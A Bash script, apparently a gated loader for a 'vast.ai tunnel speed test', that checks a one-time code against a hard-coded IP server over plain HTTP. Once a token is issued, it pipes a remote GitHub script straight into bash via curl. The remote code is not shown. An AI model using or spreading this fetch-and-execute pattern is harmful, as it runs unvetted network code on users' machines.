#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# 进度条函数
progress_bar() {
    local duration=${1}
    local width=50
    local increment=$((duration / width))
    
    for ((i=0; i<=width; i++)); do
        percentage=$((i * 2))
        filled=$i
        empty=$((width - i))
        
        printf "\r${CYAN}[${GREEN}"
        printf "%0.s█" $(seq 1 $filled)
        printf "%0.s░" $(seq 1 $empty)
        printf "${CYAN}] ${WHITE}%3d%%${NC}" $percentage
        
        sleep $increment
    done
    printf "\n"
}

# 打印带颜色的消息函数
print_message() {
    local type=$1
    local message=$2
    case $type in
        "success") echo -e "${GREEN}✅ ${message}${NC}" ;;
        "error") echo -e "${RED}❌ ${message}${NC}" ;;
        "warning") echo -e "${YELLOW}⚠️  ${message}${NC}" ;;
        "info") echo -e "${BLUE}ℹ️  ${message}${NC}" ;;
        "step") echo -e "${PURPLE}➡️  ${message}${NC}" ;;
    esac
}

# 动画加载函数
spinner() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'
    
    echo -n -e "${CYAN}${message} ${NC}"
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# 配置
TOKEN_FILE="/tmp/speedtest_current.token"
TOKEN_TTL=300
AUTH_SERVER="159.13.62.19"
AUTH_PORT="8080"

# 清屏并显示标题
clear
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║      ${WHITE}vast.ai隧道测速系统 v3.1      ║"
echo "║        需要验证码方可进行测速操作            ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# 检查当前token
if [ -f "$TOKEN_FILE" ]; then
    token_time=$(stat -c %Y "$TOKEN_FILE" 2>/dev/null || stat -f %m "$TOKEN_FILE" 2>/dev/null || echo 0)
    current_time=$(date +%s)
    time_diff=$((current_time - token_time))
    
    if [ $time_diff -gt $TOKEN_TTL ]; then
        print_message "warning" "会话已过期，请重新验证"
        rm -f "$TOKEN_FILE"
    else
        current_token=$(cat "$TOKEN_FILE")
        print_message "success" "验证通过！开始执行测速系统。。。"
        echo ""
        
        # 显示加载动画
        print_message "step" "正在加载测速系统"
        (sleep 2) &
        spinner $! "加载中"
        
        echo ""
        # 删除已使用的token
        rm -f "$TOKEN_FILE"
        # 执行实际脚本
        exec /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/534607701/nick/main/replacez5_speedtest.sh)"
        exit 0
    fi
fi

# 验证码输入
echo -e "${YELLOW}"
echo "┌──────────────────────────────────────────┐"
echo "│              验证码输入                    │"
echo "└──────────────────────────────────────────┘"
echo -e "${NC}"
print_message "info" "请输入一次性验证码:"
echo -n -e "${WHITE}验证码: ${NC}"
read -s input_code
echo ""

# 验证输入是否为空
if [ -z "$input_code" ]; then
    print_message "error" "验证码不能为空"
    exit 1
fi

# 连接到VPS服务器验证验证码
print_message "step" "正在验证验证码..."
echo -e "${CYAN}"

# 显示进度条
(progress_bar 3) &

# 实际验证过程
response_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 "http://$AUTH_SERVER:$AUTH_PORT/verify?code=$input_code")

# 等待进度条完成
wait

echo -e "${NC}"

if [ "$response_code" = "200" ]; then
    print_message "success" "验证码正确！"
    print_message "step" "正在生成访问令牌..."
    
    # 生成新的随机token
    if command -v openssl >/dev/null 2>&1; then
        new_token=$(openssl rand -hex 16 2>/dev/null)
    else
        new_token=$(date +%s%N | md5sum | head -c 32)
    fi
    
    echo "$new_token" > "$TOKEN_FILE"
    
    # 显示成功信息
    echo -e "${GREEN}"
    echo "┌──────────────────────────────────────────┐"
    echo "│              验证成功                    │"
    echo "├──────────────────────────────────────────┤"
    echo "│  令牌已生成，5分钟内有效                 │"
    echo "│  请重新执行命令以继续测速操作            │"
    echo "└──────────────────────────────────────────┘"
    echo -e "${NC}"
    
else
    print_message "error" "验证失败 (响应码: $response_code)"
    echo -e "${RED}"
    echo "┌──────────────────────────────────────────┐"
    echo "│              可能的原因                  │"
    echo "├──────────────────────────────────────────┤"
    echo "│  🔸 验证码错误或已使用                  │"
    echo "│  🔸 验证服务未运行                      │"
    echo "│  🔸 网络连接问题                        │"
    echo "└──────────────────────────────────────────┘"
    echo -e "${NC}"
    print_message "warning" "请检查网络连接或联系管理员"
    exit 1
fi
